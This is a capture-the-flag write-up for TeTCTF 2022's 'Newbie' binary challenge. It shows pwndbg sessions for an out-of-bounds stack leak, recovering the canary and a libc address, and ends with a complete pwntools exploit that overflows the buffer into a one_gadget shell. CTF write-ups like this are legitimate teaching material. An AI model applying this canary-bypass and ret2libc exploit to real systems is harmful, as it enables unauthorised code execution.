# Newbie - TeTCTF 2022
This challenge was the first pwn challenge i did from the TeTCTF 2022 event, the challenge was an awesome ret2libc with a stack canary bypass.

Thanks to amon for the help on this one, he showed me how easy it was to leak the stack canary in the current binary context.

## Looking at the binary
So here's how the program works, it first read 10 bytes from `/dev/urandom` and store them in an 16 bits unsigned integer array.

Then the program start a loop in which it asks us for an input, we have multiple input choice here are the 3 choices we have : `id `, `create `, `quit `. 

If we enter `id ` the program we look for the next characters and calls `atoi` on them, this part is vulnerable and will allow us to leak values on the stack.

If we enter `create`, the program will generate a hash using 32 rand calls, the last value entered in id is used ass seed for our rand calls, this function will also be used to leak stack values.

If we enter `quit`, the program will quit and hit the return of the main function, this is the part vulnerable to a buffer overflow.

## Finding the main function in the stripped binary
The binary is stripped hence a little harder to find the main part of our program, here's how i found the main function.

I first started the program in gdb, ran it once to have the right addresses used, then use the `info file` to find the entry point of our binary.

I then put a breakpoint at this location, then i can run the program. The program breaks at our breakpoint and we can see a bit of the current function.

```
pwndbg> b *0x5555554009c0
pwndbg> r
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x5555554009c0    xor    ebp, ebp
   0x5555554009c2    mov    r9, rdx
   0x5555554009c5    pop    rsi
   0x5555554009c6    mov    rdx, rsp
   0x5555554009c9    and    rsp, 0xfffffffffffffff0
   0x5555554009cd    push   rax
   0x5555554009ce    push   rsp
   0x5555554009cf    lea    r8, [rip + 0x4aa]
   0x5555554009d6    lea    rcx, [rip + 0x433]
   0x5555554009dd    lea    rdi, [rip + 0x3eb]
   0x5555554009e4    call   qword ptr [rip + 0x2015f6]    <__libc_start_main>
``` 

Looking at the DISASM output, we can notice that $rip+0x3eb is being put into rdi before the call to `__libc_start_main`, let's step until we're at address `0x5555554009dd` then disass the instructions at `$rip+0x3eb`.

```
pwndbg> x/10i $rip+0x3eb
   0x555555400dc8:      call   0x5555554008f0 <__stack_chk_fail@plt>
   0x555555400dcd:      leave  
   0x555555400dce:      ret    
   0x555555400dcf:      push   rbp
   0x555555400dd0:      mov    rbp,rsp
   0x555555400dd3:      sub    rsp,0x10
   0x555555400dd7:      mov    DWORD PTR [rbp-0x4],edi
   0x555555400dda:      mov    QWORD PTR [rbp-0x10],rsi
   0x555555400dde:      mov    eax,0x0
   0x555555400de3:      call   0x555555400b69

pwndbg> b *0x555555400dcf
pwndbg> del 1
```

Disassembling the instructions at ($rip+0x3eb, $rip+0x3eb+10) show us that the main function begins at address `0x555555400dcf`, so we put a breakpoint here and remove our older breakpoint.

We can then continue the program, we should hit the main function.

## Starting the exploitation of the program
Looking at RAX before the call to `create` at address `0x555555400bd1`, knowing that `id 0` correspond to the first 2 bytes we read from `/dev/urandom` we can see that these bytes are 0x779f

Let's search for these bytes somewhere on the stack.
```
pwndbg> search -t short 0x779f
[stack]		0x7fffffffdbf6 0x365b3b3fb0ef779f
```

We see that the value read inside `/dev/urandom` begins at address 0x7fffffffdbf6,

Looking at the values on the stack around the address 0x7fffffffdbf6.
```
pwndbg> x/32gx 0x7fffffffdbf6
0x7fffffffdbf6: 0x365b3b3fb0ef779f      0x6574616572633bf8
0x7fffffffdc06: 0x7ffff7e0de630000      0x0000000000140000
0x7fffffffdc16: 0x7ffff7f967600000      0x555555400f260000
0x7fffffffdc26: 0x7ffff7e0203a0000      0x0000000000000000
0x7fffffffdc36: 0x0000000000000000      0x0000000000000000
0x7fffffffdc46: 0x7fffffffdc800000      0x7fffffffdda80000
0x7fffffffdc56: 0x82bd5de3ae000000      0x7fffffffdc80e6fa
0x7fffffffdc66: 0x555555400dfe0000      0x7fffffffdda80000
0x7fffffffdc76: 0x0001000000010000      0x0000000000010000
0x7fffffffdc86: 0x7ffff7daafd00000      0x5555554000400000
0x7fffffffdc96: 0x555555400dcf0000      0x0001000000000000
0x7fffffffdca6: 0x7fffffffdda80000      0x0000000000000000
0x7fffffffdcb6: 0xd64dc4ec68470000      0x7fffffffdda8eb29
0x7fffffffdcc6: 0x555555400dcf0000      0x0000000000000000
0x7fffffffdcd6: 0x7ffff7ffbc400000      0x29b27dce68470000
0x7fffffffdce6: 0x39f89be6684714d6      0x7fff0000000014d6
```

We can see the bytes generated by `/dev/urandom` at address `0x7fffffffdbf6` are `0x365b3b3fb0ef779f`, and we know we are dealing with array of 16 bits each and we read 10 bytes in `/dev/urandom`, we can translate this string to the following.

```
id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
```

Note that we miss id 4, which should be the last 2 bytes of the address just before `0x7fffffffdbf6` which is the address we can find the value `0x365b3b3fb0ef779f` on the stack.

We can print the last 2 missing bytes using the following command inside pwndbg

```
pwndbg> x/32gx 0x7fffffffdbf6+2
0x7fffffffdbf8: 0x3bf8365b3b3fb0ef      0x0000657461657263
0x7fffffffdc08: 0x00007ffff7e0de63      0x0000000000000014
0x7fffffffdc18: 0x00007ffff7f96760      0x0000555555400f26
0x7fffffffdc28: 0x00007ffff7e0203a      0x0000000000000000
0x7fffffffdc38: 0x0000000000000000      0x0000000000000000
0x7fffffffdc48: 0x00007fffffffdc80      0x00007fffffffdda8
0x7fffffffdc58: 0xe6fa82bd5de3ae00      0x00007fffffffdc80
0x7fffffffdc68: 0x0000555555400dfe      0x00007fffffffdda8
0x7fffffffdc78: 0x0000000100000001      0x0000000000000001
0x7fffffffdc88: 0x00007ffff7daafd0      0x0000555555400040
0x7fffffffdc98: 0x0000555555400dcf      0x0000000100000000
0x7fffffffdca8: 0x00007fffffffdda8      0x0000000000000000
0x7fffffffdcb8: 0xeb29d64dc4ec6847      0x00007fffffffdda8
0x7fffffffdcc8: 0x0000555555400dcf      0x0000000000000000
0x7fffffffdcd8: 0x00007ffff7ffbc40      0x14d629b27dce6847
0x7fffffffdce8: 0x14d639f89be66847      0x00007fff00000000
```

Looking at the output  we can deduce that the last 2 missing bytes read from `/dev/urandom` are `0x3bf8`, we can then translate the whole value read from `/dev/urandom` to the following.

```
id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
id 4: 0x3bf8
```

We can confirm the following by continuing our program in the debugger and input `id 1` then break just before our call to `create` at address `0x555555400d80`.

```
pwndbg> b *0x555555400d80
Breakpoint 4 at 0x555555400d80
```

Then let's add another breakpoint right before the function that asks us for input at address `0x555555400d1a`

```
pwndbg> x/30i $rip-200
   0x555555400cb3:      lea    edi,[rip+0x236]        # 0x555555400eef
   0x555555400cb9:      mov    eax,0x0
   0x555555400cbe:      call   0x555555400970 <open@plt>
   0x555555400cc3:      mov    DWORD PTR [rbp-0x70],eax
   0x555555400cc6:      cmp    DWORD PTR [rbp-0x70],0xffffffff
   0x555555400cca:      jne    0x555555400ce2
   0x555555400ccc:      lea    rdi,[rip+0x229]        # 0x555555400efc
   0x555555400cd3:      call   0x5555554008e0 <puts@plt>
   0x555555400cd8:      mov    edi,0x0
   0x555555400cdd:      call   0x555555400990 <exit@plt>
   0x555555400ce2:      lea    rcx,[rbp-0x6a]
   0x555555400ce6:      mov    eax,DWORD PTR [rbp-0x70]
   0x555555400ce9:      mov    edx,0xa
   0x555555400cee:      mov    rsi,rcx
   0x555555400cf1:      mov    edi,eax
   0x555555400cf3:      mov    eax,0x0
   0x555555400cf8:      call   0x555555400940 <read@plt>
   0x555555400cfd:      lea    rdi,[rip+0x1fe]        # 0x555555400f02
   0x555555400d04:      mov    eax,0x0
   0x555555400d09:      call   0x555555400910 <printf@plt>
   0x555555400d0e:      lea    rax,[rbp-0x60]
   0x555555400d12:      mov    esi,0x100
   0x555555400d17:      mov    rdi,rax
   0x555555400d1a:      call   0x555555400aca
   0x555555400d1f:      lea    rax,[rbp-0x60]
   0x555555400d23:      mov    edx,0x3
   0x555555400d28:      lea    rsi,[rip+0x1d6]        # 0x555555400f05
   0x555555400d2f:      mov    rdi,rax
   0x555555400d32:      call   0x5555554008d0 <strncmp@plt>
   0x555555400d37:      test   eax,eax

pwndbg> b *0x555555400aca
```

Then we can continue and confirm that `id 1` is equal to `0xb0ef`

```
pwndbg> c
pwndbg> c 
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                <printf@plt>
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                <0x555555400aca>
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                <strncmp@plt>

pwndbg> ni
id 1

pwndbg> c
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                <printf@plt>
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                <0x555555400aca>
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                <strncmp@plt>

pwndbg> ni
create

pwndbg> c
```

After this the program should have break at address `0x555555400d80` which is right before our call to `create` where we want to be.

Looking at eax show that we were right on our theory about how this program works.

```
pwndbg> i r eax
eax            0xb0ef              45295
```

## Canaries
Knowing we can leak 2 bytes from pretty much anywhere in our program, we can use this to leak the value of the stack canary and therefore bypass it easily.
```
pwndbg> canary
AT_RANDOM = 0x7fffffffe119 # points to (not masked) global canary value
Canary    = 0xe6fa82bd5de3ae00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffd988 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda48 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdaa8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdab8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdac8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdb18 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdbc8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdc58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdd18 ◂— 0xe6fa82bd5de3ae00
```

We can notice that valid canaries have the value `0xe6fa82bd5de3ae00` *note that this value change every time we run the program*, and we are looking particularly for one that is located after our `/dev/urandom bytes buffer` at address `0x7fffffffdbf6`, the reason why is that our input is treated as a unsigned integer which means we can't use any negative offsets.

We can use the stack canary that is located at address `0x7fffffffdc58` which is located after our buffer on the stack (0x7fffffffdc58 - 0x7fffffffdbf6 = 98).

We have 98 bytes of offset between the beginning of our canary and our `10 bytes` we read out of `/dev/urandom`

Since we're dealing with nibbles, we are going to need to split our bytes in offset by 2 which give us a final offset of `49`

We are also going to need to leak something from libc, something we know that is definitely on the stack is the return address back into `__libc_start_main` from the `main` function. Searching for it tells us that it is at the stack address `0x7fffffffdc88` on the stack.

```
pwndbg> bt
#0  0x0000555555400d80 in ?? ()
#1  0x0000555555400dfe in ?? ()
#2  0x00007ffff7daafd0 in __libc_start_call_main (main=main@entry=0x555555400dcf, argc=argc@entry=1, argv=argv@entry=0x7fffffffdda8) at ../sysdeps/nptl/libc_start_call_main.h:58
#3  0x00007ffff7dab07d in __libc_start_main_impl (main=0x555555400dcf, argc=1, argv=0x7fffffffdda8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdd98) at ../csu/libc-start.c:409
#4  0x00005555554009ea in ?? ()

pwndbg> search -t qword 0x00007ffff7daafd0
[stack]         0x7fffffffdc88 0x7ffff7daafd0
```

We can now calculate the offset between the return address of `__libc_start_main` and our 10 bytes read from `/dev/urandom` the same way we did with canaries (0x7fffffffdc88 - 0x7fffffffdbf6 = 146).

Once again since we're dealing with `16 bits unsigned integer` we are going to need to split this value by 2, which will give us the final offset of `73`.

Now that we leak our canary we should be able to determine the offset of rip where our program crashes.

## Writing Exploit
With all the knowledge we've gained on this binary so far we should be ready to write an exploit script.

```py
from pwn import *
import ctypes
from one_gadget import generate_one_gadget

charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
stack_canary_offset = 49 # This is the offset we've obtained for the canary we choosed on the stack
stack___libc_start_main_offset = 73 # Since we need to leak something from libc we can leak the return address back into __libc_start_main from the main function
hashes = {} # We compute every possible hashes (65535) and add them to this array

# This function will leak the value at our offset argument.
def leak(p, offset, toggle=True):
    p.recvuntil(b"> ")
    p.sendline(b"id " + str(offset).encode())
    p.recvuntil(b"> ")
    p.sendline(b"create")
    p.recvuntil(b"Your key: ")
    key = p.recvline().strip().decode()
    value = hashes[key]
    # correct for the one and zero collision.
    if value == 1 and toggle:
        value = 0
    
    log.info(f"Offset {offset}: {key} ({hex(value)})")
    return value


# The function precompute will precompute every possible 2 bytes values that we read from /dev/urandom
def precompute():
    libc = ctypes.cdll.LoadLibrary("libc.so.6")
    global hashes
    # loop in all 2 bytes possibilities (0x0000, 0xffff), this will generate all possibilities generated by /dev/urandom
    for i in range(0xffff+1):
        libc.srand(i)
        val = ""
        for j in range(32):
            val += charset[libc.rand() % len(charset)]
        hashes[val] = i
    log.info(f"Computed {len(hashes)} hashes.")

def main():
    precompute()

    # Find themagicone gadget in the provided libc
    libc_path = "./libc-2.27.so"
    magic_offset = next(generate_one_gadget(libc_path))
    log.info(f"Found magic one gadget at offset: {hex(magic_offset)}")

    # Get the __libc_start_main offset
    libc_elf = ELF(libc_path)
    __libc_start_main_offset = libc_elf.libc_start_main_return
    log.info(f"__libc_start_main_offset {hex(__libc_start_main_offset)}")

    # start the program
    p = process("./newbie")

    # Leak the canary
    canary = 0
    for i in range(4): # Canary is 8 bytes, but we read only 2 of em each time, so we loop 4 time and do some bit shifting arithmetic
        canary += (leak(p, stack_canary_offset+i)) << (16 * i) # 16 * 4 = 64 bits (8 bytes).
    log.info(f"Leaked Canary {hex(canary)}")

    # leak the libc start main return value
    __libc_start_main = 0
    for i in range(4):
        __libc_start_main += (leak(p, stack___libc_start_main_offset + i)) << (16 * i) # 2 bytes at (stack__libc_start_main_offset + i)
    log.info(f"Leaked __libc_start_main: {hex(__libc_start_main)}")
    # Get the libc base offset
    libc_base = __libc_start_main - __libc_start_main_offset
    log.info(f"libc base address {hex(libc_base)}")
    # Calculate magic offset address using libc base
    magic = libc_base + magic_offset
    log.info(f"Magic one gadget address : {hex(magic)}")

    # Trigger Buffer Overflow
    p.recvuntil(b"> ")
    payload = b"A" * 88 + p64(canary) + p64(0x4242424242424242) + p64(magic)
    p.sendline(payload)
    # Quit to return
    p.recvuntil(b"> ")
    p.sendline(b"quit")
    log.success("Shell spawned! Enjoy !")

    p.interactive()

if __name__ == "__main__":
    main()
```